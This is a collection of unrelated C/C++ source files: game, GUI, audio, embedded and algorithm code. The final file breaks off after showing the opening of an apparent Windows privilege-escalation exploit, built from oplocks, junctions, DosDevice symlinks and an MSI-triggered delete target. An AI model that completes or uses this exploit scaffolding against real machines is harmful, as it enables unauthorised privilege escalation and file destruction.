    "// Fill out your copyright notice in the Description page of Project Settings.\n\n\n#include \"LobbyGameMode.h\"\n#include \"GameFramework/GameStateBase.h\"\n#include \"GameFramework/PlayerState.h\"\n\nvoid ALobbyGameMode::PostLogin(APlayerController* NewPlayer)\n{\n\tSuper::PostLogin(NewPlayer);\n\n\tconst APlayerState* PlayerState{NewPlayer->GetPlayerState<APlayerState>()};\n\n#pragma region Nullchecks\n\tif (!GameState)\n\t{\n\t\tUE_LOG(LogTemp, Warning, TEXT(\"%s|GameState is nullptr\"), *FString(__FUNCTION__))\n\t\treturn;\n\t}\n\tif (!PlayerState)\n\t{\n\t\tUE_LOG(LogTemp, Warning, TEXT(\"%s|PlayerState is nullptr\"), *FString(__FUNCTION__))\n\t\treturn;\n\t}\n#pragma endregion\n\n\tconst int32 NumberOfPlayers{GameState.Get()->PlayerArray.Num()};\n\n\tif (GEngine)\n\t{\n\t\tGEngine->AddOnScreenDebugMessage(\n\t\t\t1,\n\t\t\t600.f,\n\t\t\tFColor::Yellow,\n\t\t\tFString::Printf(TEXT(\"Players in game: %d\"), NumberOfPlayers)\n\t\t);\n\n\t\tconst FString PlayerName{PlayerState->GetPlayerName()};\n\n\t\tGEngine->AddOnScreenDebugMessage(\n\t\t\t-1,\n\t\t\t60.f,\n\t\t\tFColor::Cyan,\n\t\t\tFString::Printf(TEXT(\"%s has joined the game!\"), *PlayerName)\n\t\t);\n\t}\n}\n\nvoid ALobbyGameMode::Logout(AController* Exiting)\n{\n\tSuper::Logout(Exiting);\n\n\tconst APlayerState* PlayerState{Exiting->GetPlayerState<APlayerState>()};\n\n#pragma region Nullchecks\n\tif (!GameState)\n\t{\n\t\tUE_LOG(LogTemp, Warning, TEXT(\"%s|GameState is nullptr\"), *FString(__FUNCTION__))\n\t\treturn;\n\t}\n\tif (!PlayerState)\n\t{\n\t\tUE_LOG(LogTemp, Warning, TEXT(\"%s|PlayerState is nullptr\"), *FString(__FUNCTION__))\n\t\treturn;\n\t}\n#pragma endregion\n\n\tconst int32 NumberOfPlayers{GameState.Get()->PlayerArray.Num()};\n\n\tif (GEngine)\n\t{\n\t\tGEngine->AddOnScreenDebugMessage(\n\t\t\t1,\n\t\t\t600.f,\n\t\t\tFColor::Yellow,\n\t\t\tFString::Printf(TEXT(\"Players in game: %d\"), NumberOfPlayers - 1)\n\t\t);\n\n\t\tconst FString PlayerName{PlayerState->GetPlayerName()};\n\n\t\tGEngine->AddOnScreenDebugMessage(\n\t\t\t-1,\n\t\t\t60.f,\n\t\t\tFColor::Cyan,\n\t\t\tFString::Printf(TEXT(\"%s has exited the game!\"), *PlayerName)\n\t\t);\n\t}\n}\n",
    "\ufeff//-----------------------------------------------------------------------------\n// Copyright (c) 2020,\u548c\u5229\u65f6\u7cfb\u7edf\u5de5\u7a0b\u6709\u9650\u516c\u53f8\n// All rights reserved.\n//\n// \u6458\u8981: UiDialogBody.cpp \u5bf9\u8bdd\u6846\u4e2d\u5fc3\u63a7\u4ef6\u7c7b\n// \u5f53\u524d\u7248\u672c: 1.0\n// \u4f5c\u8005\uff1a liujingrui\n// \u65e5\u671f: 2020/08/04\n// \u7248\u672c\u8bf4\u660e\uff1a\u7c7b\u521d\u59cb\u7248\u672c\u5b9e\u73b0 \n//-----------------------------------------------------------------------------\n#include\"UiDialogBodyWidget.h\"\n#include <QHBoxLayout>\n#include \"UiStyleManager.h\"\n#include <QPainter>\n#include <QStyleOption>\n#include \"UiWidgetLibraryPublicCommon.h\"\n\nUiDialogBody::UiDialogBody(QWidget* parent /*= nullptr*/)\n    : QFrame(parent)\n{\n    Initialize();\n}\n\nUiDialogBody::~UiDialogBody()\n{\n    deleteLater();\n}\n\n//-----------------------------------------------------------------------------\n// \u529f\u80fd: \u91cd\u5199\u7ed8\u5236\n// \u53c2\u6570: \n// \u8fd4\u56de\u503c\uff1a \n// \u521b\u5efa\u8005\uff1aliujingrui\n// \u521b\u5efa\u65e5\u671f: 2020/10/21\n//-----------------------------------------------------------------------------\nvoid UiDialogBody::paintEvent(QPaintEvent* ev)\n{\n    QPainter painter(this);\n    QStyleOption styleOpt;\n    styleOpt.init(this);\n\n    painter.save();\n    painter.setPen(Qt::NoPen);\n    painter.setBrush(QColor(QRgb(g_iDialogBGColor)));\n    painter.drawRect(styleOpt.rect);\n\n    painter.restore();\n}\n\n//-----------------------------------------------------------------------------\n// \u529f\u80fd: \u521d\u59cb\u5316\n// \u53c2\u6570: \n// \u8fd4\u56de\u503c\uff1a \n// \u521b\u5efa\u8005\uff1aliujingrui\n// \u521b\u5efa\u65e5\u671f: 2020/08/04\n//-----------------------------------------------------------------------------\nvoid UiDialogBody::Initialize()\n{\n    setWindowFlags(windowFlags() | Qt::FramelessWindowHint);\n}\n",
    "#include \"Queue.h\"\n#include <thread>\n#include <queue>\n#include <mutex>\n#include <condition_variable>\n\n//Establishes two Queues; Two needed to ensure simultaneous message relay\nstd::queue<std::string> discordMessageQueue;\nstd::mutex discordMessageMutex;\nstd::condition_variable discordMessageCV;\n\nstd::queue<std::string> twitchMessageQueue;\nstd::mutex twitchMessageMutex;\nstd::condition_variable twitchMessageCV;\n\n\n//Handles sending messages to the discord queue\nstd::string sendToDiscordQueue(const std::string& msg) {\n\tstd::lock_guard<std::mutex> lock(discordMessageMutex);\n\tdiscordMessageQueue.push(msg);\n\tdiscordMessageCV.notify_one();\n\treturn msg;\n}\n\n//Handles retrieving messages from the discord queue\nstd::string retrieveFromDiscordQueue() {\n\tstd::unique_lock<std::mutex> lock(discordMessageMutex);\n\tdiscordMessageCV.wait(lock, [] { return !discordMessageQueue.empty(); });\n\n\tstd::string msg = std::move(discordMessageQueue.front());\n\tdiscordMessageQueue.pop();\n\treturn msg;\n}\n\n//Handles sending messages to the twitch queue\nstd::string sendToTwitchQueue(const std::string& msg) {\n\tstd::lock_guard<std::mutex> lock(twitchMessageMutex);\n\ttwitchMessageQueue.push(msg);\n\ttwitchMessageCV.notify_one();\n\treturn msg;\n}\n\n//Handles retrieving messages from the twitch queue\nstd::string retrieveFromTwitchQueue() {\n\tstd::unique_lock<std::mutex> lock(twitchMessageMutex);\n\ttwitchMessageCV.wait(lock, [] {return !twitchMessageQueue.empty(); });\n\t\n\n\tstd::string msg = std::move(twitchMessageQueue.front());\n\ttwitchMessageQueue.pop();\n\treturn msg;\n}\n",
    "#include \"Discord.h\"\n#include <time.h>\n#include <Utils.h>\n#include <ctime>\n\nusing namespace Utils;\nstatic time_t g_startTime;\n\nvoid Discord::initialize(bool setTimestamp)\n{\n    Log(\"Initializing Discord RPC...\");\n    \n    DiscordEventHandlers handlers;\n    memset(&handlers, 0, sizeof(handlers));\n    \n    // Initialize Discord RPC\n    Discord_Initialize(\"1257349372862009387\", &handlers, 1, NULL);\n\n    \n    // Prepare rich presence struct\n    DiscordRichPresence discordRichPresence;\n    memset(&discordRichPresence, 0, sizeof(discordRichPresence));\n    \n    if (setTimestamp) {\n        g_startTime = std::time(0);\n    }\n    discordRichPresence.startTimestamp = g_startTime;\n    discordRichPresence.state = \"In Menu\";\n    discordRichPresence.details = \"Playing Elden Ring\";\n    discordRichPresence.largeImageKey = \"none\";\n    discordRichPresence.largeImageText = \"Elden Ring\";\n\n    // Update Discord presence\n    update(discordRichPresence);\n}\n\nvoid Discord::update(DiscordRichPresence discordRichPresence)\n{\n\tDiscord_UpdatePresence(&discordRichPresence);\n}\n\ntime_t Discord::GetStartTime()\n{\n    return g_startTime;\n}\n",
    "/*\n\n  ESP32 FFT\n  =========\n\n  This provides a vanilla radix-2 FFT implementation and a test example.\n\n  Author\n  ------\n\n  This code was written by [Robin Scheibler](http://www.robinscheibler.org)\n  during rainy days in October 2017.\n\n  License\n  -------\n\n  Copyright (c) 2017 Robin Scheibler\n\n  Permission is hereby granted, free of charge, to any person obtaining a copy\n  of this software and associated documentation files (the \"Software\"), to deal\n  in the Software without restriction, including without limitation the rights\n  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n  copies of the Software, and to permit persons to whom the Software is\n  furnished to do so, subject to the following conditions:\n\n  The above copyright notice and this permission notice shall be included in all\n  copies or substantial portions of the Software.\n\n  THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n  SOFTWARE.\n\n*/\n#include <stdlib.h>\n#include <stdio.h>\n#include <math.h>\n#include <complex.h>\n\n#include \"fft.h\"\n\n#define TWO_PI          6.28318530\n#define USE_SPLIT_RADIX 1\n#define LARGE_BASE_CASE 1\n\nfft_config_t *fft_init(int size, fft_type_t type, fft_direction_t direction,\n                       float *input, float *output) {\n    /*\n     * Prepare an FFT of correct size and types.\n     *\n     * If no input or output buffers are provided, they will be allocated.\n     */\n    int k, m;\n\n    fft_config_t *config = (fft_config_t *)malloc(sizeof(fft_config_t));\n\n    // Check if the size is a power of two\n    if ((size & (size - 1)) != 0)  // tests if size is a power of two\n        return NULL;\n\n    // start configuration\n    config->flags     = 0;\n    config->type      = type;\n    config->direction = direction;\n    config->size      = size;\n\n    // Allocate and precompute twiddle factors\n    config->twiddle_factors = (float *)malloc(2 * config->size * sizeof(float));\n\n    float two_pi_by_n = TWO_PI / config->size;\n\n    for (k = 0, m = 0; k < config->size; k++, m += 2) {\n        config->twiddle_factors[m]     = cosf(two_pi_by_n * k);  // real\n        config->twiddle_factors[m + 1] = sinf(two_pi_by_n * k);  // imag\n    }\n\n    // Allocate input buffer\n    if (input != NULL)\n        config->input = input;\n    else {\n        if (config->type == FFT_REAL)\n            config->input = (float *)malloc(config->size * sizeof(float));\n        else if (config->type == FFT_COMPLEX)\n            config->input = (float *)malloc(2 * config->size * sizeof(float));\n\n        config->flags |= FFT_OWN_INPUT_MEM;\n    }\n\n    if (config->input == NULL) return NULL;\n\n    // Allocate output buffer\n    if (output != NULL)\n        config->output = output;\n    else {\n        if (config->type == FFT_REAL)\n            config->output = (float *)malloc(config->size * sizeof(float));\n        else if (config->type == FFT_COMPLEX)\n            config->output = (float *)malloc(2 * config->size * sizeof(float));\n\n        config->flags |= FFT_OWN_OUTPUT_MEM;\n    }\n\n    if (config->output == NULL) return NULL;\n\n    return config;\n}\n\nvoid fft_destroy(fft_config_t *config) {\n    if (config->flags & FFT_OWN_INPUT_MEM) free(config->input);\n\n    if (config->flags & FFT_OWN_OUTPUT_MEM) free(config->output);\n\n    free(config->twiddle_factors);\n    free(config);\n}\n\nvoid fft_execute(fft_config_t *config) {\n    if (config->type == FFT_REAL && config->direction == FFT_FORWARD)\n        rfft(config->input, config->output, config->twiddle_factors,\n             config->size);\n    else if (config->type == FFT_REAL && config->direction == FFT_BACKWARD)\n        irfft(config->input, config->output, config->twiddle_factors,\n              config->size);\n    else if (config->type == FFT_COMPLEX && config->direction == FFT_FORWARD)\n        fft(config->input, config->output, config->twiddle_factors,\n            config->size);\n    else if (config->type == FFT_COMPLEX && config->direction == FFT_BACKWARD)\n        ifft(config->input, config->output, config->twiddle_factors,\n             config->size);\n}\n\nvoid fft(float *input, float *output, float *twiddle_factors, int n) {\n    /*\n     * Forward fast Fourier transform\n     * DIT, radix-2, out-of-place implementation\n     *\n     * Parameters\n     * ----------\n     *  input (float *)\n     *    The input array containing the complex samples with\n     *    real/imaginary parts interleaved [Re(x0), Im(x0), ..., Re(x_n-1),\n     * Im(x_n-1)] output (float *) The output array containing the complex\n     * samples with real/imaginary parts interleaved [Re(x0), Im(x0), ...,\n     * Re(x_n-1), Im(x_n-1)] n (int) The FFT size, sho",
    "#include <Arduino.h>\n#include \"BluetoothSerial.h\" // Library for Bluetooth Serial\n//#include <esp_bt_device.h>\n#include <nvs_flash.h>\n#include <esp_bt_main.h>\n\n#include <SPIFFS.h>\n#include <WiFi.h>\n#include \"esp_bt_device.h\"\n#include \"esp_bt.h\"\n#include \"esp_spp.h\"\n\nBluetoothSerial SerialBT;\n\n#define SPP_TAG \"SPP_ACCEPTOR_DEMO\"\n#define SPP_SERVER_NAME \"ESP32_Printer\"\n\nstatic uint32_t esp_spp_handle = 0;\n\nvoid esp_spp_cb(esp_spp_cb_event_t event, esp_spp_cb_param_t *param) {\n    switch (event) {\n    case ESP_SPP_START_EVT:\n        Serial.println(\"ESP_SPP_START_EVT\");\n        esp_bt_dev_set_device_name(SPP_SERVER_NAME);\n        #if ESP_IDF_VERSION >= ESP_IDF_VERSION_VAL(4, 0, 0)\n          esp_bt_gap_set_scan_mode(ESP_BT_CONNECTABLE, ESP_BT_GENERAL_DISCOVERABLE);\n        #else\n          esp_bt_gap_set_scan_mode(ESP_BT_SCAN_MODE_CONNECTABLE_DISCOVERABLE);\n        #endif        \n        //esp_bt_gap_set_scan_mode(ESP_BT_SCAN_MODE_CONNECTABLE_DISCOVERABLE);\n        esp_spp_start_srv(ESP_SPP_SEC_AUTHENTICATE, ESP_SPP_ROLE_SLAVE, 0, SPP_SERVER_NAME);\n        break;\n    case ESP_SPP_DISCOVERY_COMP_EVT:\n        Serial.println(\"ESP_SPP_DISCOVERY_COMP_EVT\");\n        break;\n    case ESP_SPP_OPEN_EVT:\n        Serial.println(\"ESP_SPP_OPEN_EVT\");\n        esp_spp_handle = param->open.handle;\n        break;\n    case ESP_SPP_CLOSE_EVT:\n        Serial.println(\"ESP_SPP_CLOSE_EVT\");\n        esp_spp_handle = 0;\n        break;\n    case ESP_SPP_SRV_OPEN_EVT:\n        Serial.println(\"ESP_SPP_SRV_OPEN_EVT\");\n        esp_spp_handle = param->open.handle;\n        break;\n    case ESP_SPP_CL_INIT_EVT:\n        Serial.println(\"ESP_SPP_CL_INIT_EVT\");\n        break;\n    case ESP_SPP_DATA_IND_EVT:\n        Serial.printf(\"ESP_SPP_DATA_IND_EVT len=%d handle=%d\\n\", param->data_ind.len, param->data_ind.handle);\n        Serial.write(param->data_ind.data, param->data_ind.len);\n        break;\n    case ESP_SPP_CONG_EVT:\n        Serial.println(\"ESP_SPP_CONG_EVT\");\n        break;\n    case ESP_SPP_WRITE_EVT:\n        Serial.println(\"ESP_SPP_WRITE_EVT\");\n        break;\n    case ESP_SPP_INIT_EVT:\n        Serial.println(\"ESP_SPP_INIT_EVT\");\n        break;\n    case ESP_SPP_UNINIT_EVT:\n        Serial.println(\"ESP_SPP_UNINIT_EVT\");\n        break;\n    case ESP_SPP_SRV_STOP_EVT:\n        Serial.println(\"ESP_SPP_SRV_STOP_EVT\");\n        break;\n    case ESP_SPP_VFS_REGISTER_EVT:\n        Serial.println(\"ESP_SPP_VFS_REGISTER_EVT\");\n        break;\n    case ESP_SPP_VFS_UNREGISTER_EVT:\n        Serial.println(\"ESP_SPP_VFS_UNREGISTER_EVT\");\n        break;\n    default:\n        break;\n    }\n}\n\nvoid setup() {\n    if (!SPIFFS.begin(true)) {\n        Serial.println(\"An error occurred while mounting SPIFFS\");\n        return;\n    }    \n\n    Serial.begin(115200);\n    SerialBT.begin(SPP_SERVER_NAME); // Start Bluetooth serial with the given name\n\n    // Initialize NVS\n    esp_err_t ret = nvs_flash_init();\n    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {\n        ESP_ERROR_CHECK(nvs_flash_erase());\n        ret = nvs_flash_init();\n    }\n    ESP_ERROR_CHECK(ret);\n\n    esp_bt_controller_mem_release(ESP_BT_MODE_BLE);\n    esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();\n    ret = esp_bt_controller_init(&bt_cfg);\n    if (ret) {\n        Serial.printf(\"initialize controller failed: %s\\n\", esp_err_to_name(ret));\n        return;\n    }\n    ret = esp_bt_controller_enable(ESP_BT_MODE_CLASSIC_BT);\n    if (ret) {\n        Serial.printf(\"enable controller failed: %s\\n\", esp_err_to_name(ret));\n        return;\n    }\n    ret = esp_bluedroid_init();\n    if (ret) {\n        Serial.printf(\"init bluetooth failed: %s\\n\", esp_err_to_name(ret));\n        return;\n    }\n    ret = esp_bluedroid_enable();\n    if (ret) {\n        Serial.printf(\"enable bluetooth failed: %s\\n\", esp_err_to_name(ret));\n        return;\n    }\n    ret = esp_spp_init(ESP_SPP_MODE_CB);\n    if (ret) {\n        Serial.printf(\"spp init failed: %s\\n\", esp_err_to_name(ret));\n        return;\n    }\n    esp_spp_register_callback(esp_spp_cb);\n}\n\nvoid loop() {\n    static uint8_t data[100];\n    int length;\n\n    if (Serial.available()) {\n        length = Serial.readBytes(data, sizeof(data));\n        if (esp_spp_handle) {\n            esp_spp_write(esp_spp_handle, length, data);\n        } else {\n            Serial.println(\"Bluetooth not connected\");\n        }\n    }\n}\n\nextern \"C\" {\nvoid app_main() {\n    // Your setup code here\n    setup(); \n\n    // Your main loop code here\n    while (true) {\n        loop();\n    }\n}\n}",
    "/*\r\n  ==============================================================================\r\n\r\n    This file contains the basic framework code for a JUCE plugin processor.\r\n\r\n  ==============================================================================\r\n*/\r\n\r\n#include \"PluginProcessor.h\"\r\n#include \"PluginEditor.h\"\r\n\r\n//==============================================================================\r\nSimpleEQAudioProcessor::SimpleEQAudioProcessor()\r\n#ifndef JucePlugin_PreferredChannelConfigurations\r\n     : AudioProcessor (BusesProperties()\r\n                     #if ! JucePlugin_IsMidiEffect\r\n                      #if ! JucePlugin_IsSynth\r\n                       .withInput  (\"Input\",  juce::AudioChannelSet::stereo(), true)\r\n                      #endif\r\n                       .withOutput (\"Output\", juce::AudioChannelSet::stereo(), true)\r\n                     #endif\r\n                       )\r\n#endif\r\n{\r\n}\r\n\r\nSimpleEQAudioProcessor::~SimpleEQAudioProcessor()\r\n{\r\n}\r\n\r\n//==============================================================================\r\nconst juce::String SimpleEQAudioProcessor::getName() const\r\n{\r\n    return JucePlugin_Name;\r\n}\r\n\r\nbool SimpleEQAudioProcessor::acceptsMidi() const\r\n{\r\n   #if JucePlugin_WantsMidiInput\r\n    return true;\r\n   #else\r\n    return false;\r\n   #endif\r\n}\r\n\r\nbool SimpleEQAudioProcessor::producesMidi() const\r\n{\r\n   #if JucePlugin_ProducesMidiOutput\r\n    return true;\r\n   #else\r\n    return false;\r\n   #endif\r\n}\r\n\r\nbool SimpleEQAudioProcessor::isMidiEffect() const\r\n{\r\n   #if JucePlugin_IsMidiEffect\r\n    return true;\r\n   #else\r\n    return false;\r\n   #endif\r\n}\r\n\r\ndouble SimpleEQAudioProcessor::getTailLengthSeconds() const\r\n{\r\n    return 0.0;\r\n}\r\n\r\nint SimpleEQAudioProcessor::getNumPrograms()\r\n{\r\n    return 1;   // NB: some hosts don't cope very well if you tell them there are 0 programs,\r\n                // so this should be at least 1, even if you're not really implementing programs.\r\n}\r\n\r\nint SimpleEQAudioProcessor::getCurrentProgram()\r\n{\r\n    return 0;\r\n}\r\n\r\nvoid SimpleEQAudioProcessor::setCurrentProgram (int index)\r\n{\r\n}\r\n\r\nconst juce::String SimpleEQAudioProcessor::getProgramName (int index)\r\n{\r\n    return {};\r\n}\r\n\r\nvoid SimpleEQAudioProcessor::changeProgramName (int index, const juce::String& newName)\r\n{\r\n}\r\n\r\n//==============================================================================\r\nvoid SimpleEQAudioProcessor::prepareToPlay (double sampleRate, int samplesPerBlock)\r\n{\r\n    // Use this method as the place to do any pre-playback\r\n    // initialisation that you need..\r\n}\r\n\r\nvoid SimpleEQAudioProcessor::releaseResources()\r\n{\r\n    // When playback stops, you can use this as an opportunity to free up any\r\n    // spare memory, etc.\r\n}\r\n\r\n#ifndef JucePlugin_PreferredChannelConfigurations\r\nbool SimpleEQAudioProcessor::isBusesLayoutSupported (const BusesLayout& layouts) const\r\n{\r\n  #if JucePlugin_IsMidiEffect\r\n    juce::ignoreUnused (layouts);\r\n    return true;\r\n  #else\r\n    // This is the place where you check if the layout is supported.\r\n    // In this template code we only support mono or stereo.\r\n    // Some plugin hosts, such as certain GarageBand versions, will only\r\n    // load plugins that support stereo bus layouts.\r\n    if (layouts.getMainOutputChannelSet() != juce::AudioChannelSet::mono()\r\n     && layouts.getMainOutputChannelSet() != juce::AudioChannelSet::stereo())\r\n        return false;\r\n\r\n    // This checks if the input layout matches the output layout\r\n   #if ! JucePlugin_IsSynth\r\n    if (layouts.getMainOutputChannelSet() != layouts.getMainInputChannelSet())\r\n        return false;\r\n   #endif\r\n\r\n    return true;\r\n  #endif\r\n}\r\n#endif\r\n\r\nvoid SimpleEQAudioProcessor::processBlock (juce::AudioBuffer<float>& buffer, juce::MidiBuffer& midiMessages)\r\n{\r\n    juce::ScopedNoDenormals noDenormals;\r\n    auto totalNumInputChannels  = getTotalNumInputChannels();\r\n    auto totalNumOutputChannels = getTotalNumOutputChannels();\r\n\r\n    // In case we have more outputs than inputs, this code clears any output\r\n    // channels that didn't contain input data, (because these aren't\r\n    // guaranteed to be empty - they may contain garbage).\r\n    // This is here to avoid people getting screaming feedback\r\n    // when they first compile a plugin, but obviously you don't need to keep\r\n    // this code if your algorithm always overwrites all the output channels.\r\n    for (auto i = totalNumInputChannels; i < totalNumOutputChannels; ++i)\r\n        buffer.clear (i, 0, buffer.getNumSamples());\r\n\r\n    // This is the place where you'd normally do the guts of your plugin's\r\n    // audio processing...\r\n    // Make sure to reset the state if your inner loop is processing\r\n    // the samples and the outer loop is handling the channels.\r\n    // Alternatively, you can process the samples with the channels\r\n    // interleaved by keeping the same state.\r\n    for (int channel = 0; channel < totalNumInputChannels; ++channel)\r\n    {\r\n        auto* channelData = buffer.getWritePointer (channel);\r\n\r\n        // ..do somet",
    "// ProgressDialog.cpp : implementation file\n//\n\n#include \"stdafx.h\"\n#include \"WOE5Extract.h\"\n#include \"WOE5ExtractDoc.h\"\n#include \"WOE5ExtractView.h\"\n#include \"ProgressDialog.h\"\n\n#include \"../OE5Extract/OEAddressRoutines.h\"\n\n#ifdef _DEBUG\n#define new DEBUG_NEW\n#undef THIS_FILE\nstatic char THIS_FILE[] = __FILE__;\n#endif\n\n/////////////////////////////////////////////////////////////////////////////\n// CProgressDialog dialog\n\n\nCProgressDialog::CProgressDialog(CWnd* pParent /*=NULL*/)\n    : CDialog(CProgressDialog::IDD, pParent)\n{\n    //{{AFX_DATA_INIT(CProgressDialog)\n        // NOTE: the ClassWizard will add member initialization here\n    //}}AFX_DATA_INIT\n    bFirstTime = true;\n}\n\n\nvoid CProgressDialog::DoDataExchange(CDataExchange* pDX)\n{\n    CDialog::DoDataExchange(pDX);\n    //{{AFX_DATA_MAP(CProgressDialog)\n    DDX_Control(pDX, IDC_CANCEL, m_Cancel);\n    DDX_Control(pDX, IDC_STEP, m_Step);\n    DDX_Control(pDX, IDC_PROGRESS1, m_Progress);\n    //}}AFX_DATA_MAP\n}\n\n\nBEGIN_MESSAGE_MAP(CProgressDialog, CDialog)\n    //{{AFX_MSG_MAP(CProgressDialog)\n    ON_WM_DESTROY()\n    ON_WM_TIMER()\n    ON_BN_CLICKED(IDC_CANCEL, OnCancel)\n    //}}AFX_MSG_MAP\nEND_MESSAGE_MAP()\n\n/////////////////////////////////////////////////////////////////////////////\n// CProgressDialog message handlers\n\nvoid CProgressDialog::OnDestroy()\n{\n    theApp.m_pMainWnd->BringWindowToTop( );\n//  theApp.m_pMainWnd->SetFocus ( );\n\n    CDialog::OnDestroy();\n    \n    // TODO: Add your message handler code here\n    KillTimer ( PROGRESS_THREAD_TIMER );\n\n    theApp.m_ProgressThread = NULL;\n    \n}\n\nBOOL CProgressDialog::OnInitDialog()\n{\n    CDialog::OnInitDialog();\n    \n    bFirstTime = true;\n\n    // TODO: Add extra initialization here\n    m_Step.SetWindowText ( \"\" );\n    m_Progress.SetRange32 ( 0, GetFileLength ( ) );\n    m_Progress.SetPos ( 0 );\n\n    SetTimer ( PROGRESS_THREAD_TIMER, 100, NULL );\n    \n    return TRUE;  // return TRUE unless you set the focus to a control\n                  // EXCEPTION: OCX Property Pages should return FALSE\n}\n\nvoid CProgressDialog::OnTimer(UINT nIDEvent)\n{\n    // TODO: Add your message handler code here and/or call default\n\n    m_Step.SetWindowText ( GetProcessStep ( ) );\n    m_Progress.SetRange32 ( 0, GetFileLength ( ) );\n    m_Progress.SetPos ( GetFilePosition ( ) );\n\n    CDialog::OnTimer(nIDEvent);\n\n    if ( bFirstTime )\n    {\n        bFirstTime = false;\n        BringWindowToTop( );\n    }\n}\n\nvoid CProgressDialog::OnCancel()\n{\n    // TODO: Add your control notification handler code here\n    SetAddressRoutinesCancel ( true );\n    //      get document\n\n    CWOE5ExtractView *pView = ( CWOE5ExtractView * ) ( theApp.m_View );\n    if ( pView == NULL )\n    {\n        return;\n    }\n\n    CWOE5ExtractDoc *pDoc = pView->GetDocument ();\n    if ( pDoc == NULL )\n    {\n        return;\n    }\n\n    pDoc->OnNewDocument ( );\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"optimal_lc\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "//....only....start....and....end.....keep....changing....in....the....segment....tree!!!\n#include<bits/stdc++.h>\nusing namespace std;\ntypedef long long int ll;\nll a[200000];\nll segtree[1000000];\n\nvoid build(ll node,ll start,ll end)\n{\n    if(start==end)\n    {\n        segtree[node]=a[start];\n    }\n    else\n    {\n        ll mid=(start+end)/2;\n        build(2*node,start,mid);\n        build(2*node+1,mid+1,end);\n        segtree[node]=segtree[2*node]+segtree[2*node+1];\n    }\n    \n    \n    \n}\n\n\nll query(ll node,ll start,ll end,ll l,ll r)\n{\n    \n    if(start>r || end<l)\n    {\n        return 0;\n    }\n    \n    if(start>=l && end<=r)\n    {\n        return segtree[node];\n    }\n    \n   \n        ll mid=(start+end)/2;\n        \n        ll left=query(node*2,start,mid,l,r);\n        ll right=query(node*2+1,mid+1,end,l,r);\n        \n        return (left+right);\n        \n    \n    \n}\n\n\n\n\nvoid update(ll node,ll start,ll end,ll ind,ll value)\n{\n    if(start==end)\n    {\n        segtree[node]=value;\n        a[ind]=value;\n    }\n    else\n    {\n        ll mid=(start+end)/2;\n        \n        if(ind<=mid)\n        {\n            update(2*node,start,mid,ind,value);\n        }\n        else\n        {\n             update(2*node+1,mid+1,end,ind,value);\n        }\n        \n        segtree[node]=segtree[2*node] + segtree[2*node+1];\n        \n        \n        \n    }\n    \n    \n    \n}\n\nint main() \n{\nll n;\ncin>>n;\nll i=0;\nwhile(i<=n-1)\n{\n    cin>>a[i];\n    i++;\n}\nbuild(1,0,n-1);\nupdate(1,0,n-1,4,100);    \ncout<<query(1,0,n-1,1,4);\n    \n    return 0;\n}\n",
    "#include <Windows.h>\n#include <Shlwapi.h>\n#include <Msi.h>\n#include <PathCch.h>\n#include <AclAPI.h>\n#include <iostream>\n#include \"resource.h\"\n#include \"def.h\"\n#include \"FileOplock.h\"\n#pragma comment(lib, \"Msi.lib\")\n#pragma comment(lib, \"Shlwapi.lib\")\n#pragma comment(lib, \"PathCch.lib\")\n#pragma comment(lib, \"rpcrt4.lib\")\n#pragma warning(disable:4996)\n\nFileOpLock* oplock;\nHANDLE hFile, hFile2, hFile3;\nHANDLE hthread;\nNTSTATUS retcode;\nHMODULE hm = GetModuleHandle(NULL);\nWCHAR dir[MAX_PATH] = { 0x0 };\nWCHAR dir2[MAX_PATH] = { 0x0 };\nWCHAR file[MAX_PATH] = { 0x0 };\nWCHAR file2[MAX_PATH] = { 0x0 };\nWCHAR file3[MAX_PATH] = { 0x0 };\nWCHAR targetDeleteFile[MAX_PATH] = { 0x0 };\n\n\nBOOL Move(HANDLE hFile);\nHANDLE myCreateDirectory(LPWSTR file, DWORD access, DWORD share, DWORD dispostion);\nLPWSTR  BuildPath(LPCWSTR path);\nvoid load();\nBOOL CreateJunction(LPCWSTR dir, LPCWSTR target);\nVOID Fail();\nVOID cb1();\nBOOL DosDeviceSymLink(LPCWSTR object, LPCWSTR target);\nBOOL DelDosDeviceSymLink(LPCWSTR object, LPCWSTR target);\nLPWSTR CreateTempDirectory();\nBOOL DeleteJunction(LPCWSTR dir);\nvoid Trigger1();\n\n\n\n\nBOOL Move(HANDLE hFile) {\n\tif (hFile == INVALID_HANDLE_VALUE) {\n\t\tprintf(\"[!] Invalid handle!\\n\");\n\t\treturn FALSE;\n\t}\n\twchar_t 